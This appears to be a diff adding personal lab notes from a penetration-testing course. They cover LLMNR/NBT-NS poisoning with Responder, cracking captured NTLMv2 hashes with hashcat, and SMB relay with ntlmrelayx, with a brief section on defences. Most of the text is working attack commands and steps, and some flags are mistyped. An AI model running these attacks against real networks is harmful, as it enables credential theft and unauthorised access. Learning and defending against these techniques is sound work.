@@ -1,1 +1,88 @@
+-------------------------------------------Introduction-------------------------------------------
+we are going to go through how we can abuse features of windows 
 
+https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
+
+good starting point for the attacks
+
+--------------------------------------------LLMNR Poisoning Overview--------------------------------------------
+LLMNR - Link local multicast and name resolution also known as (NBT-NS)
+
+(Used to identify hosts when DNS fails to do so.
+
+KEY FLAW : IT response back , service contains username and NTLMv2 HASH 
+
+We gone a use Responder.py
+
+step 1:$python Responder -l tun0 -rdw -v
+step 2:An Event Occurs(something failing to do DNS)
+step 3:Get Dem Hash
+step 4:Crack Dem Hashes
+hashcat -m 5600 hashes.txt rockyou.txt
+
+we are doing man in the middle listening c, which fails dns
+
+----------------------------------------------CAPTURING NTLMv2 Hashes with responder------------------------------------
+in kali machine
+$responder -I eth0 -rdwv
+
+started listening
+
+Go to windows server 2016 machine
+
+in quick access give \\192.168.57.139 , press enter
+
+got the hash in the listener  `
+
+install hashcat to crack the hash
+
+-----------------------------------------------Password cracking with Hashcat---------------------------------------
+copy the hash and paste it in the text file (hashcat --help | grep NTLM
+
+$hashcat -m 5600 ntlmhash.txt rockyou.txt -o (crack ntlm password)
+
+FOR WORDLISTS : SECLISTS
+
+------------------------------------------LLMNR Poisoning Defense------------------------------------
+The best defense in this case is to disable LLMNR and NBT-NS
+
+1.Navigate to Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client. 
+Under DNS Client, make sure that "Turn OFF Multicast Name Resolution" is set to Enabled.
+2.Require network access control
+3.Require stromg user password 
+----------------------------------------SMB Relay Attacks Overview---------------------------------------
+instead getting hashes through responder , instead relay those hashes to specific machines
+and potentially gain access.
+
+step 1:Run Responder (gedit responder.conf)
+step 2: Python Responder.py -l tun0 -rdw 
+step 3:set up your relay
+python ntlmrelayx.py -tf targets.txt -smbb2support
+step 4:An error event
+step 5:Win
+--------------------------------------quick update----------------------------
+Turn on network discovery and file sharing
+---------------------------------------Discovering hosts with SMB signing Disabled-------------------------------
+To known SMB sign enable or disable:
+1.nessus scan
+
+2.nmap 
+$nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
+
+3.smb signing check
+
+-------------------------------------SMB Relay attack demonstration part 1------------------------------
+create target.txt and paste the targets
+
+$gedit /etc/responder/Responder.conf
+
+turn off smb and http
+
+$responder -I eth0 -rdwv
+$python ntlmrelayx.py -tf targets.txt -smbb2support
+
+in punisher machine , go to quick access , type the \\ipaddress , got a error
+
+we will SAM hash.get the hash and crack it
+
+-------------------------------------
